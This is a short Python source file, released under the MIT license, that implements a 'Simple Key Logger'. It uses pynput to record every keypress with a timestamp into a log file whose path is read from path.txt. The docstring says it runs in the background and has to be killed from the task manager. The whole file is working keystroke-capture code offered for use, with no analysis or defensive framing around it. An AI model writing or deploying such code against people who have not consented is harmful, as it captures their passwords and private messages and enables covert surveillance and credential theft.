# -*- coding: utf-8 -*-
"""
Simple Key Logger

The keylogger runs in the background,
to terminate end all python tasks from task manager


============================================================================
MIT License

Copyright (c) 2019 Tim Seymore

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import logging
from pynput.keyboard import Listener


with open("path.txt", 'r') as f:
    LOG_FILE = f.read()


class KeyLogger:
    def __init__(self):
        path = LOG_FILE[2:-1]
        style = '%(asctime)s: %(message)s'        
        logging.basicConfig(filename=path, level=logging.DEBUG, format=style)

    def start(self):
        with Listener(on_press=self.on_key_press) as listener:
            listener.join()

    @staticmethod
    def on_key_press(key):
        logging.info(str(key))


if __name__ == "__main__":
    KeyLogger().start()
